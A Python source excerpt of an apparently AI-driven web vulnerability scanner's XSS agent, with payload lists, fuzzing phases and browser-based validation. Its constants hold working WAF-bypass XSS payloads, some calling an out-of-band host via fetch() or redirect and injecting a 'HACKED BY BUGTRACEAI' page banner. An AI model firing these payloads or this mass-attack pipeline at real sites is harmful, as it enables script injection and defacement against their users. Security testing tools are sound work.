    v3.2: Context-aware technology stack integration via TechContextMixin
    """
    
    MAX_BYPASS_ATTEMPTS = 6
    # Multi-stage probe pattern: Tests for characters: " < > &
    # Note: Single quote removed - it causes 500 errors on some servers (e.g., ginandjuice)
    # Single quote testing is done separately if needed
    # Note: CSTI detection is now handled by the dedicated CSTIAgent
    PROBE_STRING = "BT7331\"<>&"

    # Alternative probe for servers that error on double quotes
    PROBE_STRING_SAFE = "BT7331xss"

    # ====== OMNIPROBE: Reconnaissance payload for Phase 1 ======
    # Purpose: Detect reflection points and escaping behavior for XSS only
    # Tests: quotes, backslash-quotes, HTML tags, backticks
    # NO CSTI/SSTI templates - that's CSTIAgent's job
    # NO execution code - just probing what survives
    OMNIPROBE_PAYLOAD = "BT7331'\"<>`\\'\\\""

    # Elite payloads that bypass many WAFs - Pure XSS (CSTI now handled by CSTIAgent)
    GOLDEN_PAYLOADS = [
        # ====== CRITICAL: BACKSLASH-QUOTE BREAKOUTS (ginandjuice.shop killer) ======
        # These MUST be in top 20 to be tested. For JS contexts where server escapes \ to \\ but not quotes.
        # Input: \' → Server: \\' = escaped backslash + unescaped quote = BREAKOUT
        "\\';var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//",
        "\\';alert(document.domain)//",
        "\\\";var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//",
        "\\\";alert(document.domain)//",

        # ====== HIGH PRIORITY ELITE PAYLOADS (VISUAL + OOB) ======
    # THE OMNI-PROBE (User Inspired): XSS + CSTI + SSTI Polyglot
    "'\"><script id=bt-pwn>fetch('https://{{interactsh_url}}')</script>{{7*7}}${7*7}<% 7*7 %>",
    
    # Double Encoding with Visual Banner
        "%253Csvg%2520onload%253D%2522fetch%2528%2527https%253A%252F%252F{{interactsh_url}}%2527%2529%253Bvar%253Ddocument.createElement%2528%2527div%2527%2529%253Bb.id%253D%2527bt-pwn%2527%253Bb.style%253D%2527background%253Ared%253Bcolor%253Awhite%253Btext-align%253Acenter%253Bpadding%253A10px%253Bposition%253Afixed%253Btop%253A0%253Bleft%253A0%253Bwidth%253A100%2525%253Bz-index%253A9999%253Bfont-weight%253Abold%253B%2527%253Bb.innerText%253D%2527HACKED%2520BY%2520BUGTRACEAI%2527%253Bdocument.body.prepend%2528b%2529%253B%2522%253E",
        # THE LEVEL 9 KILLER: Double backslash + Visual Banner (avoiding 'on')
        "\\\");fetch('https://{{interactsh_url}}');(function(){var b=document.createElement('div');b.id='bt-pwn';b.style='background:red;color:white;text-align:center;padding:10px;position:fixed;top:0;left:0;width:100%;z-index:9999;font-weight:bold;';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);})();//",
        # Unicode breakout with Visual Banner
        "\\u0022);fetch('https://{{interactsh_url}}');var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);//",
        # Template literal with Visual Banner
        "\\`+fetch('https://{{interactsh_url}}')+(function(){var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);})()+\\`",
        
        # ====== CLASSIC & VISUAL PAYLOADS ======
        "\\\";var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);//", # Backslash Breakout Visual
        "\"><img src=x onerror=var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)>", # Attribute Breakout Visual
        "<svg/onload=var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)>", # SVG Visual
        "\"><svg/onload=var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)>", # SVG Attribute Breakout (Standard)
        "\"><svg/onload=document.body.appendChild(document.createElement('div')).id='bt-pwn'>", # SVG Zero-Space (Race.es Killer)
        "\"><svg/onload=fetch('https://{{interactsh_url}}')>", # SVG Space-less (Race.es Bypass)
        "\"><svg/onload=document.location='https://{{interactsh_url}}'>", # SVG Redirect (Race.es Aggressive)
        "\"><iframe src=javascript:alert(document.domain)>", # Iframe Protocol Bypass (Proven Winner)
        "';{const d=document.createElement('div');d.style='position:fixed;top:0;width:100%;background:red;color:white;text-align:center;z-index:9999;padding:10px;font-size:24px;font-weight:bold;';d.innerText='HACKED BY BUGTRACEAI';document.body.prepend(d)};//", # USER SUGGESTED VISUAL BREAKOUT
        "javascript:var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)//", # Protocol Visual
        "';var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);//", # Semicolon Breakout Visual
        "<details open ontoggle=fetch('https://{{interactsh_url}}')>"
        # NOTE: Backslash-quote breakouts moved to TOP of array for priority testing
    ]
    
    # Fragment-based payloads (DOM XSS via location.hash → innerHTML)
    # These bypass WAFs that filter query params but allow hash fragments
    FRAGMENT_PAYLOADS = [
        "<img src=x onerror=alert(document.domain)>", # Improved validation for Level 7
        "<img src=x onerror=fetch('https://{{interactsh_url}}')>",
        "<img src=x onerror=var b=document.createElement('div');b.id='bt-pwn';b.innerText='FRAGMENT XSS';document.body.prepend(b)>",
        "<svg/onload=fetch('https://{{interactsh_url}}')>",
        "<svg/onload=var b=document.createElement('div');b.id='bt-pwn';b.innerText='FRAGMENT XSS';document.body.prepend(b)>",
        "<iframe src=javascript:fetch('https://{{interactsh_url}}')>",
        "<details open ontoggle=fetch('https://{{interactsh_url}}')>",
        "<body onload=fetch('https://{{interactsh_url}}')>",
        "<marquee onstart=fetch('https://{{interactsh_url}}')>",
        # mXSS mutation payloads (Level 8)
        "<svg><style><img src=x onerror=alert(document.domain)>",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(document.domain)>\">",
        "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=</style><img src=x onerror=alert(document.domain)>",
    ]

    # L0.5 Smart context-specific payloads (NEVER alert(1) — always real impact)
    SMART_PAYLOADS = {
        "js_sq_breakout": "\\';document.title=document.domain//",
        "js_dq_breakout": "\\\";document.title=document.domain//",
        "html_svg": "<svg onload=document.title=document.domain>",
        "html_img": "<img src=x onerror=document.title=document.domain>",
        "attr_dq_breakout": "\" onmouseover=document.title=document.domain x=\"",
        "attr_sq_breakout": "' onmouseover=document.title=document.domain x='",
        # Tag-closing attribute breakouts: the '">' family. The "x=" variants above only
        # add an event handler to the HOST tag, which is useless inside a tag that never
        # fires one (<meta>, <link>, <input type=hidden>); closing the tag and injecting a
        # fresh one always executes.
        "attr_dq_tag_breakout": "\"><svg onload=document.title=document.domain>",
        "attr_sq_tag_breakout": "'><svg onload=document.title=document.domain>",
        "script_breakout": "</script><script>document.title=document.domain</script>",
    }

    def __init__(
        self,
        url: str,
        params: List[str] = None,
        report_dir: Path = None,
        headless: bool = True,
        event_bus: Any = None
    ):
        super().__init__("XSSAgentV4", "XSS Specialist (Phoenix Edition)", event_bus, agent_id="xss_agent_v4")
        self.url = url
        self.params = params or []
        self.report_dir = report_dir or Path("./reports")
        self.headless = headless

        # Load technology profile for context-aware exploitation
        from bugtrace.utils.tech_loader import load_tech_profile
        self.tech_profile = load_tech_profile(self.report_dir)

        # Tools
        self.interactsh: Optional[InteractshClient] = None
        # v3.2.1: CDP disabled - Playwright only (L3)
        # Flow: HTTP → Playwright (L3) → VALIDATED_CONFIRMED
        self.verifier = XSSVerifier(headless=headless, prefer_cdp=False)
        self.payload_learner = PayloadLearner()

        # NEGATIVE EVIDENCE: one closed record per parameter the escalation ladder touched,
        # so "tested hard, nothing executable" stops being indistinguishable from
        # "never tested". _xss_cov is the record currently open (None between parameters).
        self._xss_coverage: List[xss_coverage.ParamCoverage] = []
        self._xss_cov: Optional[xss_coverage.ParamCoverage] = None

        # Results
        self.findings: List[XSSFinding] = []
        self.interactsh = None
        
        # WAF AWARENESS & STEALTH (Now uses framework's Q-Learning WAF intelligence)
        self.consecutive_blocks = 0
        self.stealth_mode = False
        self.last_request_time = 0
        self._detected_waf: Optional[str] = None
        self._waf_confidence: float = 0.0

        # Deduplication (TASK-50: Thread-safe with lock)
        self._tested_params = set()
        self._tested_params_lock = asyncio.Lock()

        # Victory Hierarchy: Track if we achieved maximum impact
        self._max_impact_achieved = False

        # Queue consumption mode (Phase 19)
        self._queue_mode = False  # True when consuming from queue
        self._worker_pool: Optional[WorkerPool] = None
        self._scan_context: str = ""

        # Expert deduplication: Track emitted findings by fingerprint
        self._emitted_findings: set = set()  # (url, param, context)

        # Global XSS root cause deduplication: group DOM XSS by root cause
        self._global_xss_findings: Dict[tuple, List[str]] = {}  # root_cause_fingerprint -> [affected_urls]

        # WET → DRY transformation (Two-phase processing)
        self._dry_findings: List[Dict] = []  # Dedup'd findings after Phase A

        # v3.2.0: Context-aware tech stack (loaded in start_queue_consumer)
        self._tech_stack_context: Dict = {}
        self._xss_prime_directive: str = ""

        # v3.1.0: Hybrid Engine components
        self._go_bridge: Optional[GoFuzzerBridge] = None
        self._payload_amplifier: Optional[PayloadAmplifier] = None
        self._hybrid_mode: bool = True  # Enable hybrid engine by default

    # =========================================================================
    # HYBRID ENGINE (v3.1.0): Go + Python + LLM
    # =========================================================================

    async def _init_hybrid_engine(self) -> bool:
        """
        Initialize the hybrid engine components (Go fuzzer + Amplifier).

        Returns:
            True if initialization succeeded
        """
        try:
            # Initialize Go bridge with WAF-aware settings
            concurrency = 50 if not self._detected_waf else 10  # Slower for WAF
            timeout = 5 if not self._detected_waf else 10

            self._go_bridge = GoFuzzerBridge(
                concurrency=concurrency,
                timeout=timeout
            )

            # Try to compile Go binary if needed
            await self._go_bridge.compile_if_needed()

            # Initialize payload amplifier
            self._payload_amplifier = PayloadAmplifier()

            logger.info(f"[{self.name}] Hybrid engine initialized (Go concurrency={concurrency})")
            return True

        except FileNotFoundError as e:
            logger.warning(f"[{self.name}] Hybrid engine unavailable: {e}")
            logger.warning(f"[{self.name}] Falling back to pure Python mode")
            self._hybrid_mode = False
            return False
        except Exception as e:
            logger.error(f"[{self.name}] Hybrid engine init failed: {e}")
            self._hybrid_mode = False
            return False

    async def _hybrid_phase1_omniprobe(
        self,
        param: str,
        interactsh_url: str
    ) -> Optional[Reflection]:
        """
        Phase 1: Quick omniprobe test using Go fuzzer.

        Uses OMNIPROBE_PAYLOAD for reconnaissance - tests what characters
        survive and where they reflect. NO execution code.

        Probe tests: ' " < > ` \\' \\" {{7*7}} ${7*7}

        Returns:
            Reflection with context info if reflected, None otherwise
        """
        if not self._go_bridge:
            return None

        # Use dedicated OMNIPROBE_PAYLOAD for reconnaissance (not GOLDEN_PAYLOADS)
        omniprobe = self.OMNIPROBE_PAYLOAD

        dashboard.log(f"[{self.name}] ⚡ Phase 1: Go Omniprobe on '{param}'", "INFO")
        dashboard.set_current_payload(omniprobe[:50], "XSS Omniprobe", "Testing")

        try:
            reflection = await self._go_bridge.run_omniprobe(
                url=self.url,
                param=param,
                omniprobe_payload=omniprobe
            )

            if reflection and reflection.reflected:
                if not reflection.encoded:
                    dashboard.log(
                        f"[{self.name}] 🎯 Omniprobe REFLECTED unencoded in {reflection.context}!",
                        "SUCCESS"
                    )
                    return reflection
                else:
                    dashboard.log(
                        f"[{self.name}] ⚠️ Omniprobe reflected but encoded ({reflection.encoding_type})",
                        "WARN"
                    )
            return None

        except Exception as e:
            logger.error(f"[{self.name}] Phase 1 omniprobe error: {e}")
            return None

    async def _hybrid_phase2_seed_generation(
        self,
        param: str,
        html: str,
        context_data: Dict,
        interactsh_url: str,
        seed_count: int = 50
    ) -> List[str]:
        """
        Phase 2: Generate seed payloads using LLM.

        Analyzes the DOM context and generates targeted seed payloads
        optimized for the specific injection point.

        Args:
            param: Parameter name
            html: HTML response from probe
            context_data: Reflection context analysis
            interactsh_url: Interactsh callback URL
            seed_count: Number of seeds to generate

        Returns:
            List of seed payload strings
        """
        dashboard.log(f"[{self.name}] 🧠 Phase 2: LLM Seed Generation ({seed_count} seeds)", "INFO")

        # Use existing LLM analysis but request more payloads
        smart_payloads = await self._llm_smart_dom_analysis(
            html=html,
            param=param,
            probe_string=self.PROBE_STRING,
            interactsh_url=interactsh_url,
            context_data=context_data
        )

        seeds = []

        # Extract payload strings from LLM response
        for sp in smart_payloads:
            payload = sp.get("payload", "")
            if payload:
                seeds.append(self._clean_payload(payload, param))

        # Add GOLDEN_PAYLOADS as additional seeds (proven effective)
        for gp in self.GOLDEN_PAYLOADS[:20]:  # Top 20 golden payloads
            payload = gp.replace("{{interactsh_url}}", interactsh_url)
            if payload not in seeds:
                seeds.append(payload)

        # Add fragment payloads for DOM XSS coverage
        for fp in self.FRAGMENT_PAYLOADS[:10]:
            payload = fp.replace("{{interactsh_url}}", interactsh_url)
            if payload not in seeds:
                seeds.append(payload)

        logger.info(f"[{self.name}] Phase 2 generated {len(seeds)} seed payloads")
        return seeds

    async def _hybrid_phase3_amplification(
        self,
        seeds: List[str],
        context_data: Dict
    ) -> List[str]:
        """
        Phase 3: Amplify seeds using breakout prefixes.

        Multiplies seed payloads by combining with context-appropriate
        breakout prefixes from breakouts.json.

        Args:
            seeds: List of seed payloads
            context_data: Reflection context (determines which breakouts to use)

        Returns:
            Amplified list of payloads (seeds × breakouts)
        """
        if not self._payload_amplifier:
            return seeds

        dashboard.log(f"[{self.name}] 🔄 Phase 3: Amplifying {len(seeds)} seeds", "INFO")

        # Determine priority based on context
        context = context_data.get("context", "html_text")
        max_priority = 2 if context in ("javascript", "attribute_value") else 3

        amplified = self._payload_amplifier.amplify(
            seed_payloads=seeds,
            category="xss",
            max_priority=max_priority,
            deduplicate=True
        )

        dashboard.log(
            f"[{self.name}] 📈 Amplified to {len(amplified)} payloads "
            f"(×{len(amplified) // max(len(seeds), 1)} expansion)",
            "INFO"
        )

        return amplified

    async def _hybrid_phase4_mass_attack(
        self,
        param: str,
        payloads: List[str]
    ) -> FuzzResult:
        """
        Phase 4: Mass payload testing using Go fuzzer.

        Fires all amplified payloads at high speed using the Go binary,
        collecting reflection data.

        Args:
            param: Parameter to test
            payloads: Amplified payload list

        Returns:
            FuzzResult with reflections and metadata
        """
        if not self._go_bridge:
            logger.warning(f"[{self.name}] Go bridge unavailable, skipping mass attack")
            return FuzzResult(
                target=self.url,
                param=param,
                total_payloads=0,
                total_requests=0,
                duration_ms=0,
                requests_per_second=0.0
            )

        dashboard.log(
            f"[{self.name}] 🚀 Phase 4: Go Mass Attack ({len(payloads)} payloads)",
            "INFO"
        )
        dashboard.set_status("XSS Mass Attack", f"Testing {len(payloads)} payloads on {param}")

        result = await self._go_bridge.run(
            url=self.url,
            param=param,
            payloads=payloads
        )

        if result.reflections:
            dashboard.log(
                f"[{self.name}] 📊 Mass attack: {len(result.reflections)} reflections "
                f"@ {result.requests_per_second:.1f} req/s",
                "INFO"
            )
        else:
            dashboard.log(
                f"[{self.name}] ⚠️ Mass attack: No reflections detected",
                "WARN"
            )

        return result

    async def _hybrid_phase5_validation(
        self,
        param: str,
        fuzz_result: FuzzResult,
        screenshots_dir: Path,
        reflection_type: str,
        surviving_chars: str,
        injection_ctx: Any,
        visual_payloads: Optional[List[str]] = None
    ) -> Optional[XSSFinding]:
        """
        Phase 5: Validate suspicious reflections using browser.

        PRIORITY ORDER:
        1. Visual payloads (from Phase 4.5) - tested FIRST because they provide
           screenshot evidence with "HACKED BY BUGTRACEAI" banner for Vision AI
        2. Regular candidates from Go fuzzer

        Args:
            param: Parameter name
            fuzz_result: Results from Go mass attack
            screenshots_dir: Directory for validation screenshots
            reflection_type: Context type for reporting
            surviving_chars: Character survival metadata
            injection_ctx: Injection context for reporting
            visual_payloads: Payloads with visible banner (from Phase 4.5)

        Returns:
            XSSFinding if validated, None otherwise
        """
        # =====================================================================
        # STEP 1: Test VISUAL PAYLOADS first (BULLETPROOF validation)
        # These payloads inject visible "HACKED BY BUGTRACEAI" banner
        # If one works → Screenshot → Vision confirms → MAXIMUM EVIDENCE
        # =====================================================================
        if visual_payloads:
            dashboard.log(
                f"[{self.name}] 🎨 Phase 5.1: Testing {len(visual_payloads)} VISUAL payloads first",
                "INFO"
            )

            for i, payload in enumerate(visual_payloads):
                if self._max_impact_achieved:
                    break

                dashboard.set_current_payload(
                    f"VISUAL [{i+1}/{len(visual_payloads)}]",
                    "XSS Visual Test",
                    "Testing banner payload"
                )

                logger.debug(f"[{self.name}] Testing visual payload: {payload[:60]}...")

                # Use browser validation with screenshot capture
                evidence = await self._validate_visual_payload(
                    param=param,
                    payload=payload,
                    screenshots_dir=screenshots_dir
                )

                if evidence and evidence.get("vision_confirmed"):
                    dashboard.log(
                        f"[{self.name}] ✅ XSS CONFIRMED via VISUAL + VISION AI!",
                        "SUCCESS"
                    )

                    finding = self._create_xss_finding(
                        param=param,
                        payload=payload,
                        context="Visual Banner Injection",
                        validation_method="visual_playwright_vision",
                        evidence=evidence,
                        confidence=0.99,  # Maximum confidence with visual proof
                        reflection_type=reflection_type,
                        surviving_chars=surviving_chars,
                        successful_payloads=[payload],
                        injection_ctx=injection_ctx,
                        bypass_technique="visual_banner_injection",
                        bypass_explanation="DeepSeek generated visual payload, Playwright executed, Vision AI confirmed banner visible"
                    )

                    return finding

            dashboard.log(
                f"[{self.name}] Visual payloads tested, falling back to regular candidates",
                "INFO"
            )

        # =====================================================================
        # STEP 2: Test regular candidates from Go fuzzer
        # v3.3: HTTP-first validation - only browser if HTTP can't confirm
        # =====================================================================
        if not fuzz_result.reflections:
            return None

        # Prioritize candidates by suspiciousness
        candidates = sorted(
            fuzz_result.reflections,
            key=lambda r: (
                r.is_suspicious,
                r.context in ("javascript", "attribute_value"),
                not r.encoded
            ),
            reverse=True
        )

        # Skip encoded reflections unless in very dangerous context
        candidates = [
            r for r in candidates
            if not r.encoded or r.context in ("javascript", "event_handler")
        ]

        if not candidates:
            return None

        dashboard.log(
            f"[{self.name}] 🎯 Phase 5.2: Validating {len(candidates)} candidates (HTTP-first)",
            "INFO"
        )

        # --- PASS 1: HTTP validation (fast, no browser) ---
        browser_candidates = []
        for reflection in candidates[:15]:
            if self._max_impact_achieved:
                break

            payload = reflection.payload
            dashboard.set_current_payload(payload[:50], "XSS HTTP Check", "Validating")

            # Re-send payload and check HTTP response for confirmation
            response_html = await self._send_payload(param, payload)
            if not response_html:
                continue

            evidence = {}
            if self._can_confirm_from_http_response(payload, response_html, evidence):
                dashboard.log(
                    f"[{self.name}] ✅ XSS CONFIRMED via HTTP analysis (no browser needed)!",
                    "SUCCESS"
                )
                finding = self._create_xss_finding(
                    param=param, payload=payload,
                    context=f"Hybrid Engine: {reflection.context}",
                    validation_method="hybrid_go_http",
                    evidence=evidence, confidence=0.90,
                    reflection_type=reflection_type,
                    surviving_chars=surviving_chars,
                    successful_payloads=[payload],
                    injection_ctx=injection_ctx,
                    bypass_technique=f"breakout_{reflection.context}",
                    bypass_explanation=f"Go fuzzer detected reflection, HTTP response confirmed executable XSS"
                )
                self._update_learned_breakouts(payload)
                return finding

            # Payload reflects but HTTP can't confirm → browser candidate
            if payload in (response_html or ""):
                browser_candidates.append(reflection)

        # --- PASS 2: Browser validation (slow, only for promising reflections) ---
        if browser_candidates:
            dashboard.log(
                f"[{self.name}] Phase 5.2b: Browser validation for {min(len(browser_candidates), 5)} promising reflections",
                "INFO"
            )
            for reflection in browser_candidates[:5]:
                if self._max_impact_achieved:
                    break

                payload = reflection.payload
                dashboard.set_current_payload(payload[:50], "XSS Browser", "Validating")

                evidence = await self._validate_via_browser(self.url, param, payload)
                if evidence:
                    dashboard.log(
                        f"[{self.name}] ✅ XSS CONFIRMED via browser validation!",
                        "SUCCESS"
                    )
                    finding = self._create_xss_finding(
                        param=param, payload=payload,
                        context=f"Hybrid Engine: {reflection.context}",
                        validation_method="hybrid_go_playwright",
                        evidence=evidence, confidence=0.95,
                        reflection_type=reflection_type,
                        surviving_chars=surviving_chars,
                        successful_payloads=[payload],
                        injection_ctx=injection_ctx,
                        bypass_technique=f"breakout_{reflection.context}",
                        bypass_explanation=f"Go fuzzer detected reflection in {reflection.context}, validated via Playwright"
                    )
                    self._update_learned_breakouts(payload)
                    return finding

        dashboard.log(
            f"[{self.name}] Phase 5: {len(candidates)} candidates tested, none confirmed",
            "WARN"
        )

        return None

    async def _validate_visual_payload(
        self,
        param: str,
        payload: str,
        screenshots_dir: Path
    ) -> Optional[Dict[str, Any]]:
        """
        Validate a visual payload (with HACKED BY BUGTRACEAI banner).

        This is the BULLETPROOF validation:
        1. Playwright navigates to URL with payload
        2. Detects XSS execution (dialog, DOM markers)
        3. Captures screenshot
        4. Vision AI confirms "HACKED BY BUGTRACEAI" banner is visible

        Args:
            param: Parameter name
            payload: Visual payload with banner injection
            screenshots_dir: Directory to save screenshot

        Returns:
            Evidence dict with vision_confirmed=True if fully validated
        """
        attack_url = self._build_attack_url(param, payload)

        # Use verify_xss with screenshot capture
        result = await self.verifier.verify_xss(
            url=attack_url,
            screenshot_dir=str(screenshots_dir),
            timeout=10.0,
            max_level=3  # Playwright only for visual payloads
        )

        if not result.success:
            return None

        evidence = {
            "playwright_confirmed": True,
            "screenshot_path": result.screenshot_path,
            "method": "L3: Playwright + Vision",
            "level": 3,
            "status": "PENDING_VISION"
        }
        evidence.update(result.details or {})

        # CRITICAL: Vision AI validation of screenshot
        if result.screenshot_path:
            await self._run_vision_validation(
                screenshot_path=result.screenshot_path,
                attack_url=attack_url,
                payload=payload,
                evidence=evidence
            )

            if evidence.get("vision_confirmed"):
                evidence["status"] = "VALIDATED_CONFIRMED"
                evidence["validation_method"] = "visual_playwright_vision"
                return evidence

        # Playwright confirmed but Vision didn't see banner
        # Still return evidence but without vision_confirmed
        return evidence

    # =========================================================================
    # AUTO-VALIDATION: Override BaseAgent validation with XSS-specific logic
    # =========================================================================

    def _validate_before_emit(self, finding: Dict) -> tuple[bool, str]:
        """
        XSS-specific validation before emitting finding.

        Requirements for XSS findings:
        1. Basic validation (type, url) from BaseAgent
        2. Must have evidence dict
        3. Evidence should have confirmation (screenshot, alert_triggered, or vision_confirmed)
        4. Payload should look like XSS (not conversational)

        Args:
            finding: Finding dict (the nested 'finding' key from event payload)

        Returns:
            (is_valid, error_message) tuple
        """
        # Call parent validation first (checks type, url, conversational payloads)
        is_valid, error = super()._validate_before_emit(finding)
        if not is_valid:
            return False, error

        # XSS-specific validation
        evidence = finding.get("evidence", {})

        # Check for proof of execution
        has_screenshot = evidence.get("screenshot") or evidence.get("screenshot_path")
        has_alert = evidence.get("alert_triggered")
        has_vision = evidence.get("vision_confirmed")
        has_interactsh = evidence.get("interactsh_callback")
        has_http_confirmed = evidence.get("http_confirmed") or evidence.get("manipulator_confirmed")

        if not (has_screenshot or has_alert or has_vision or has_interactsh or has_http_confirmed):
            return False, "XSS requires proof: screenshot, alert, vision confirmation, HTTP confirmation, or Interactsh callback"

        # Payload sanity check (should have XSS chars)
        payload = finding.get("payload", "")
        if payload and not any(c in str(payload) for c in '<>\'"();`'):
            return False, f"XSS payload missing attack characters: {payload[:50]}"

        # All checks passed
        return True, ""

    def _emit_xss_finding(self, finding_dict: Dict, status: str = None, needs_cdp: bool = False) -> bool:
        """
        Helper to emit XSS finding using BaseAgent.emit_finding() with validation.

        Args:
            finding_dict: The nested 'finding' dict with type, url, parameter, payload, etc.
            status: Validation status (e.g., "VALIDATED_CONFIRMED")
            needs_cdp: Whether finding needs CDP validation

        Returns:
            True if the finding passed `_validate_before_emit` and was emitted;
            False if it was rejected. Callers MUST branch on this before logging
            success — a rejected finding never reaches the event bus, and a log
            line that claims otherwise makes the drop invisible.
        """
        # Wrap in full event structure
        full_event = {
            "specialist": "xss",
            "finding": finding_dict,
            "status": status or ValidationStatus.VALIDATED_CONFIRMED.value,
            "validation_requires_cdp": needs_cdp,
            "scan_context": self._scan_context,
        }

        # Use BaseAgent.emit_finding() which validates before emitting
        result = self.emit_finding(finding_dict)

        if not result:
            return False

        # Emit the full event structure for backward compatibility
        from bugtrace.core.event_bus import EventType
        if settings.WORKER_POOL_EMIT_EVENTS:
            asyncio.create_task(self.event_bus.emit(EventType.VULNERABILITY_DETECTED, full_event))
        return True

    async def _capture_proof_screenshot(self, finding_dict: Dict) -> None:
        """Best-effort: capture a real browser screenshot of a confirmed XSS PoC.

        XSS is usually confirmed early at the HTTP level (L0.5 smart probe), which
        short-circuits the escalation BEFORE the browser stage (L5) — so validated
        findings shipped with `screenshot_path: None` and no visual proof. This
        decouples evidence capture from the escalation short-circuit: for ANY
        confirmed finding that still lacks a screenshot, navigate a real browser to
        the exploit URL and capture one. The finding is already confirmed, so a
        capture failure NEVER affects validation (purely additive report evidence).
        """
        try:
            evidence = finding_dict.get("evidence")
            if not isinstance(evidence, dict):
                evidence = {}
            if evidence.get("screenshot") or evidence.get("screenshot_path") or finding_dict.get("screenshot_path"):
                return  # already has visual proof (e.g. L5 / DOM path)

            payload = finding_dict.get("payload")
            param = finding_dict.get("parameter")
            base_url = finding_dict.get("url") or self.url
            if not payload:
                return

            # The proof screenshot must show the VISIBLE "HACKED BY BUGTRACEAI"
            # banner, not the silent document.title/7*7 payload that confirmed the
            # finding over HTTP (that paints nothing in the body → a plain-page
            # repro_attempt shot). Translate silent → visual with the SAME
            # single-source transform the report uses, and screenshot THAT. The
            # finding is already confirmed, so this is purely additive evidence.
            vuln_type = finding_dict.get("type") or "XSS"
            try:
                from bugtrace.agents.reporting_mod.finding_processor import upgrade_payload
                visible_payload = upgrade_payload(payload, vuln_type) or payload
            except Exception:
                visible_payload = payload

            # Build the exploit URL from the VISIBLE payload against the finding's
            # OWN url. Any pre-stored exploit_url was built from the silent payload,
            # so rebuild whenever we have a parameter to inject into.
            exploit_url = None
            if param:
                try:
                    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
                    _p = urlparse(base_url)
                    _q = {k: (v[0] if isinstance(v, list) else v)
                          for k, v in parse_qs(_p.query, keep_blank_values=True).items()}
                    _q[param] = visible_payload
                    exploit_url = urlunparse((_p.scheme, _p.netloc, _p.path,
                                              _p.params, urlencode(_q), _p.fragment))
                except Exception:
                    exploit_url = None
            if not exploit_url:
                # No param (e.g. DOM/path sink): fall back to any stored URL, then base.
                exploit_url = finding_dict.get("exploit_url") or base_url
            if not exploit_url:
                return

            shots_dir = self.report_dir / "screenshots"
            shots_dir.mkdir(parents=True, exist_ok=True)

            # Playwright first — multi-threaded, so concurrent captures run in
            # parallel. Fast path that handles most XSS.
            result = await self.verifier.verify_xss(
                exploit_url, screenshot_dir=str(shots_dir), timeout=12.0, max_level=3
            )
            path = getattr(result, "screenshot_path", None)

            # Playwright is NOT a real browser, so some XSS won't actually execute
            # in it (the screenshot would show the page WITHOUT the PoC firing).
            # When Playwright did not confirm execution, fall back to a real Chrome
            # via CDP for a true firing screenshot. CDP is single-threaded, so
            # serialize the fallback with a process-wide lock — only the few XSS
            # Playwright can't render pay the serialization cost.
            if not getattr(result, "success", False):
                try:
                    if await self.verifier._check_cdp_available():
                        async with _CDP_PROOF_LOCK:
                            cdp_res = await self.verifier._verify_with_cdp(
                                exploit_url, str(shots_dir), 12.0, None
                            )
                        cdp_path = getattr(cdp_res, "screenshot_path", None)
                        if getattr(cdp_res, "success", False) and cdp_path:
                            result, path = cdp_res, cdp_path
                            logger.info(f"[{self.name}] 📸 CDP fallback captured real PoC for {finding_dict.get('parameter')}")
                except Exception as cdp_err:
                    logger.debug(f"[{self.name}] CDP proof fallback skipped: {cdp_err}")
            # Only attach a shot where the banner ACTUALLY fired (result.success is
            # True for a Playwright hit, or reassigned from a successful CDP fallback
            # above). verify_xss also returns a repro_attempt_*.png when nothing
            # rendered — shipping that plain page as the PoC would contradict the
            # finding's own banner payload, so gate the store on success.
            if path and getattr(result, "success", False):
                # Store a path RELATIVE to the report dir so the WEB can fetch it
                # via GET /scans/{id}/files/{relpath} (the serve route is :path).
                try:
                    rel_path = str(Path(path).resolve().relative_to(self.report_dir.resolve()))
                except Exception:
                    rel_path = path
                finding_dict["screenshot_path"] = rel_path
                finding_dict.setdefault("evidence", {})
                if isinstance(finding_dict["evidence"], dict):
                    finding_dict["evidence"]["screenshot"] = rel_path
                    finding_dict["evidence"]["screenshot_captured_post_confirm"] = True
                    # Record the URL that actually produced the banner shot, so the
                    # report can present a PoC consistent with the screenshot.
                    finding_dict["evidence"]["visual_exploit_url"] = exploit_url
                logger.info(f"[{self.name}] 📸 Captured PoC screenshot for {finding_dict.get('parameter')}: {rel_path}")

                # (a) Align the reproduction to the banner request we ACTUALLY
                # navigated for this screenshot, so the report's http_request /
                # repro / WEB AI-Repeater replay demonstrates the SAME visible
                # banner as the screenshot, curl and (upgraded) payload — instead
                # of the silent document.title detection probe, which replays to a
                # blank page. The original probe is preserved as `detection_request`
                # so no forensic detail is lost. Only for GET-style reflected XSS
                # (exploit_url was built from `param`); best-effort, never fatal.
                if param:
                    try:
                        repro = finding_dict.get("repro")
                        det = repro.get("confirming_request") if isinstance(repro, dict) else None
                        if isinstance(det, dict) and str(det.get("method", "GET")).upper() == "GET":
                            repro.setdefault("detection_request", det)
                            banner_cr = dict(det)
                            banner_cr["url"] = exploit_url
                            repro["confirming_request"] = banner_cr
                            repro["capture_method"] = "visual_banner"
                            finding_dict["http_request"] = _build_raw_http(banner_cr)
                    except Exception as _repro_err:
                        logger.debug(f"[{self.name}] repro banner-align skipped: {_repro_err}")

